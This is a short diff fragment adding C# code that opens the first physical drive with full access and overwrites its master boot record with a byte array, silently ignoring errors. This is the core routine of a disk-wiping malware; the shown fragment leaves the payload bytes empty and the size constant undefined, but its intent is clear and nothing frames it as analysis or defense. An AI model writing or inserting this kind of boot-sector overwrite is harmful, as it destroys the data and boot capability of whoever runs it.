@@ -1,0 +1,9 @@
+var mbrData = new byte[] {};
+            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
+                OpenExisting, 0, IntPtr.Zero);
+            try
+            {
+                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
+                CloseHandle(mbr);
+            }
+            catch { }
